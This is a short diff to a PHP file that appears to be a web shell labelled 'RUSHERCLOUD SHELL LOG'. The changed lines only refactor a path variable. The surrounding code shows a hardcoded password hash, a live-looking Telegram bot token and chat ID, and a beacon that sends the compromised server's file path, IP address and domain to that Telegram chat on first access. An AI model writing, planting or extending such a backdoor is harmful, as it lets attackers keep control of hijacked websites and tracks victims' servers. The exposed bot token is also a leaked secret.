@@ -13,8 +13,7 @@ $hashed_password = '$2y$10$n7OXssNZ0RXYQ.ehxDfjCeema90KbFax4VwOQg6ndtlo2vZxLpska
 $TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";
 $TELEGRAM_CHAT_ID   = "-1003212759603";
 $TELEGRAM_TOPIC_ID  = 3;
-$realpath = realpath(__FILE__);
-$session_key_tele = 'notified_' . md5($realpath);
+$session_key_tele = 'notified_' . md5(realpath(__FILE__));
 
 function sendToTelegram($message)
 {
@@ -32,7 +31,7 @@ function sendToTelegram($message)
 
 if (!isset($_SESSION[$session_key_tele])) {
     $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
-    $msg .= "Path: <code>$realpath</code>\n";
+    $msg .= "Path: <code>" . realpath(__FILE__) . "</code>\n";
     $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
     $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
     $msg .= "First Access: " . date("d-m-Y H:i:s");
